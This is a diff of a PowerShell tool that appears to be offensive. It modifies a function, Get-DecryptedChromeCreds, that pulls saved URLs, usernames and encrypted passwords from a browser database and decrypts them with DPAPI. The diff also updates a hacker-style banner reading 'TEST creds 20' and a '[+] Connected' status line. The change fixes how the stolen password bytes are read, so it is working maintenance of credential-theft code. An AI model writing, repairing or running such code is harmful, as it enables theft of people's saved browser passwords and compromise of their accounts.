@@ -469,9 +469,7 @@ function Get-DecryptedChromeCreds {
             try {
                 $url = $reader.GetString(0)
                 $username = $reader.GetString(1)
-                $encPass = $reader["password_value"]
-                $encBytes = New-Object byte[] $encPass.Length
-                $encPass.Read($encBytes, 0, $encBytes.Length) | Out-Null
+                $encBytes = $reader["password_value"]
 
                 if ($encBytes[0..2] -eq @(0x01,0x00,0x00)) {
                     $plainText = [System.Security.Cryptography.ProtectedData]::Unprotect(
@@ -800,7 +798,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 19 +sql
+                                            TEST creds 20 +sql
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
